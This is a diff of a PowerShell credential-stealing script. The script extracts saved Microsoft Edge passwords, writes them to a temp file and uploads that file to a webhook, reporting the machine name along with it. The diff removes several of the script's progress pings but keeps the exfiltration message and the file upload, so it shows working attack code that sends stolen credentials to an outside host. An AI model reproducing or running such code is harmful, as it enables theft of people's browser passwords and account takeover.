@@ -6,9 +6,6 @@ if ([string]::IsNullOrEmpty($webhookUrl)) {
     exit 1
 }
 
-# Optional: Send immediate ping to confirm execution
-Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body (@{ content = "New script triggered on $env:COMPUTERNAME" } | ConvertTo-Json) -ContentType 'application/json'
-
 # Check current PowerShell version
 if ($PSVersionTable.PSVersion.Major -lt 7) {
     # Check if pwsh is available
@@ -267,7 +264,7 @@ $edgeResults = Extract-EdgePasswords -loginDataPath $edgeLoginData -localStatePa
 
 #temp debugging
 Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body (@{
-    content = "🔍 Extracted $($edgeResults.Count) password entries from Edge on $env:COMPUTERNAME"
+    content = "Extracted $($edgeResults.Count) password entries from Edge on $env:COMPUTERNAME"
 } | ConvertTo-Json) -ContentType 'application/json'
 
 # Output to file in temp directory instead of Desktop
@@ -282,22 +279,9 @@ $edgeResults | ForEach-Object {
 
 Write-Host "Passwords saved to: $outputFile"
 
-#temp debugging
-# Check if output file exists
 if (Test-Path $outputFile) {
-    # Optional: notify about file presence
-    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body (@{
-        content = "Output file created at: $outputFile"
-    } | ConvertTo-Json) -ContentType 'application/json'
-
-    # Optional: show how many entries were found
-    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body (@{
-        content = "Edge credentials extracted: $($edgeResults.Count)"
-    } | ConvertTo-Json) -ContentType 'application/json'
-
     # Proceed with file upload
     $form = @{
-        content = "Extracted Edge Passwords:"
         file = Get-Item $outputFile
     }
     try {
